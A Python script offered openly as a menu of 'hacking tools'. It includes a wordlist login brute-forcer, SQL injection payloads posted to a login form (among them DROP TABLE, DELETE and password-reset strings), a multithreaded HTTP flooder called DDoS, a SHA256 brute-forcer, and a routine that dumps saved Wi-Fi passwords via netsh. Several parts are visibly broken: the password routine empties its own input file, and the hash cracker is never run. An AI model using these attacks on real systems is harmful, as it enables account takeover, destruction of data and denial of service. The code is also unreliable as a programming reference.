import httpx
import requests
import threading
import itertools
import hashlib
import subprocess
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse

class HackingTools:
    def PasswordCracker(InputFieldI, Link, NFN, LF, OkCode):
        url = Link
        currentpswd = ""
        payload = {}

        def setpayload():
            payload["username"] = InputFieldI
            payload["passwd"] = currentpswd
            payload["signin"] = "Next"
            payload["acrumb"] = "dummy_value"
        file_name = NFN
        with open(file_name, 'w') as file:
            file.write("")
        file_name = LF
        file_name = NFN
        lines_list = []
        with open(file_name, 'r') as file:
            lines_list = file.readlines()
        for i in range(len(lines_list)):
            currentpswd = lines_list[i].strip()
            setpayload()
            with httpx.Client() as client:
                response = client.post(url, data=payload)
            if response.status_code == OkCode:
                print("STATUS: CRACKED")
                print("RESULT:", currentpswd)
                print("RESPONSE CODE:", OkCode)
                file_name = NFN
                with open(file_name, 'w') as file:
                    file.write(currentpswd)
                return
        print("STATUS: NOT_CRACKED")
        print("RESULT: PASSWORD NOT FOUND IN LIST")
        print("LAST RESPONSE CODE:", "ERROR")
    def SQLI_Hack(target_url, target_username):
        payloads = [
            f"' UNION SELECT null, username, password FROM users WHERE username = '{target_username}' --",
            f"'; DROP TABLE users WHERE username = '{target_username}'; --",
            f"' OR 1=1 AND username = '{target_username}' --",
            f"{target_username}' OR '1'='1' --",
            f"'; SELECT * FROM information_schema.tables WHERE table_schema = '{target_username}'; --",
            f"' OR 'a'='a' --",
            f"'; UPDATE users SET password = 'new_password' WHERE username = '{target_username}'; --",
            f"{target_username}' OR 1=1; --",
            f"'; SELECT column_name FROM information_schema.columns WHERE table_name = 'users'; --",
            f"{target_username}' OR 'x'='x' --",
            f"'; DELETE FROM users WHERE username = '{target_username}'; --",
            f"' OR 1=1; DROP TABLE users; --",
            f"{target_username}' OR 1=1; DROP TABLE users; --",
            f"'; SELECT * FROM users WHERE username = '{target_username}' AND password LIKE '%a%'; --",
            f"' OR '1'='1'; --",
            f"'; SELECT COUNT(*) FROM users; --",
            f"{target_username}' OR '1'='1' LIMIT 1; --",
            f"'; SELECT * FROM users WHERE username = '{target_username}' AND LENGTH(password) > 5; --",
            f"{target_username}' OR '1'='1' LIMIT 1 OFFSET 1; --",
            f"'; SELECT * FROM users WHERE username = '{target_username}' AND password LIKE 'a%'; --",
            f"' OR 1=1 ORDER BY username; --",
            f"{target_username}' OR '1'='1' ORDER BY 1; --",
            f"'; SELECT * FROM users WHERE username = '{target_username}' AND password = 'password'; --",
            f"' OR '1'='1'; --",
            f"'; SELECT * FROM users WHERE username = '{target_username}' AND password = 'password'; --",
        ]

        for payload in payloads:
            response = requests.post(target_url, data={"username": payload, "password": "test"})
            print(f"Payload: {payload}\nResponse: {response.text}\n{'-'*30}")
    def DDoS(Url):
        import threading
        global attacki
        attacki = 1
        import time
        def Attack():
            while True:
                with httpx.Client() as client:
                    client.post(Url, data="BFIE3NY284XB6RT&#@e&*tN8*N@TE@^T787whuyb8nx&#N@E^FRFFV#")
                attacki +=1
                if attacki <= 100000:
                    time.sleep(1)
        thread1 = threading.Thread(target=Attack, name='Thread 1')
        thread2 = threading.Thread(target=Attack, name='Thread 2')
        thread3 = threading.Thread(target=Attack, name='Thread 3')
        thread4 = threading.Thread(target=Attack, name='Thread 4')
        thread5 = threading.Thread(target=Attack, name='Thread 5')
        thread1.start()
        thread2.start()
        thread3.start()
        thread4.start()
        thread5.start()
    def SHA256_CrackHash(target_hash):
        def Brute():
            characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_-+=<>?/"
            max_length = 200  # Set the maximum length of the password

            for length in range(1, max_length + 1):
                for combination in itertools.product(characters, repeat=length):
                    password = ''.join(combination)
                    hashed_password = hashlib.sha256(password.encode()).hexdigest()
                    if hashed_password == target_hash:
                        return f"Hash successfully cracked! Password is: {password}"
        thread1 = threading.Thread(target=Brute, name='Thread 1')
        thread2 = threading.Thread(target=Brute, name='Thread 2')
        thread3 = threading.Thread(target=Brute, name='Thread 3')
        thread4 = threading.Thread(target=Brute, name='Thread 4')
        thread5 = threading.Thread(target=Brute, name='Thread 5')
        thread1.start()
        thread2.start()
        thread3.start()
        thread4.start()
        thread5.start()
    def RetrieveWifiPasswords():
        try:
            data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
            profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
            for profile in profiles:
                results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear']).decode('utf-8').split('\n')
                results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
                try:
                    password = results[0]
                except IndexError:
                    password = ""
                print("{:<30}|  {:<}".format(profile, password))
        except subprocess.CalledProcessError as e:
            print(f"Error: {e}")
    def WebCrawler(U, D):
        class WebCrawler:
            def __init__(self, base_url, depth=3):
                self.base_url = base_url
                self.depth = depth
                self.visited_urls = set()

            def crawl(self, current_url, current_depth):
                if current_depth > self.depth or current_url in self.visited_urls:
                    return

                try:
                    response = requests.get(current_url)
                    if response.status_code == 200:
                        soup = BeautifulSoup(response.text, 'html.parser')
                        title = soup.title.string.strip() if soup.title else "No Title"
                        print(f"Title at {current_url}: {title}")

                        # Extract and print other relevant information as needed

                        self.visited_urls.add(current_url)

                        # Recursive crawling for links
                        for link in soup.find_all('a', href=True):
                            next_url = urljoin(current_url, link['href'])
                            if self.is_same_domain(next_url):
                                self.crawl(next_url, current_depth + 1)

                except requests.RequestException as e:
                    print(f"Error accessing {current_url}: {e}")
            def is_same_domain(self, url):
                return urlparse(url).netloc == urlparse(self.base_url).netloc

            def start_crawling(self):
                print(f"Starting web crawling from {self.base_url} with depth {self.depth}...\n")
                self.crawl(self.base_url, 1)
                def is_same_domain(self, url):
                    return urlparse(url).netloc == urlparse(self.base_url).netloc
        crawler = WebCrawler(U, int(D))
        crawler.start_crawling()
#The tools you can use are:
#Password Cracker
#SQL Injections
#DDoS
#SHA256 Hash Cracker (A little bit slower than the other tools)
#WiFi Password Retriever
#WebCrawler
while True:
    attack = input("What attack do you want to use? PC, SQLI, DDOS, SHA256CRACKER, WIFIPR, WEBCRAWLER")
    if attack == "PC":
        us = input("(Enter now the username)")
        l = input("(Enter now the login link)")
        NFN = input("(Enter now the file of where the password should be entered)")
        LF = input("(Enter now the password list like rockyou.txt.gz)")
        OC = input("(Enter now the Ok Code that says the login is successfull)")
        HackingTools.PasswordCracker(us, l, NFN, LF, OC)
    if attack == "SQLI":
        us = input("Enter the username  ")
        l = input("Enter the login link  ")
        HackingTools.SQLI_Hack(l, us)
    if attack == "DDOS":
        l = input("Enter the link  ")
        HackingTools.DDoS(l)
    if attack == "SHA256CRACKER":
        us = input("Target hash:  ")
    if attack == "WIFIPR":
        HackingTools.RetrieveWifiPasswords()
    if attack == "WEBCRAWLER":
        l = input("Login link:  ")
        d = int(input("Depth:  "))
        HackingTools.WebCrawler(l, d)
